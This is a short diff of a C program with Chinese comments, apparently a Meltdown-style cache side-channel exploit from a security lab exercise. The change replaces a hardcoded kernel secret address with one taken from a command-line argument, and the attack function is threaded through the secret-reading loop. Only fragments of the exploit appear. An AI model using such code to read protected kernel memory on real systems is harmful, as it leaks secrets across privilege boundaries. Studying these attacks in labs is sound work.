@@ -14,7 +14,7 @@ uint8_t array[256*4096];
 // Cache 命中的阈值 
 #define CACHE_HIT_THRESHOLD (200)
 #define DELTA 0 
-#define secret_addr 0xffffffffc04f5000
+
 
 // 保存堆栈上下文
 static sigjmp_buf jbuf;
@@ -114,7 +114,7 @@ static void catch_segv()
 }
 
 // attack
-void attack(int step,int *scores,int fd){
+void attack(int step,int *scores,int fd,size_t secret_addr){
   int i,j,ret;
   
   for(i=0;i<256;i++){
@@ -162,10 +162,11 @@ void attack(int step,int *scores,int fd){
 }
 
 
-int main()
+int main(int argc, char *argv[])
 {
   int i, j, ret = 0;
   
+  size_t secret_addr = strtoull(argv[1], NULL, 0);
   // 绑定信号与处理函数 
   signal(SIGSEGV, catch_segv);
 
@@ -185,7 +186,7 @@ int main()
   
   //获取 Secret
   for(i=0; i<8;i++){
-      attack(i,scores,fd);
+      attack(i,scores,fd,secret_addr);
   }
 
 
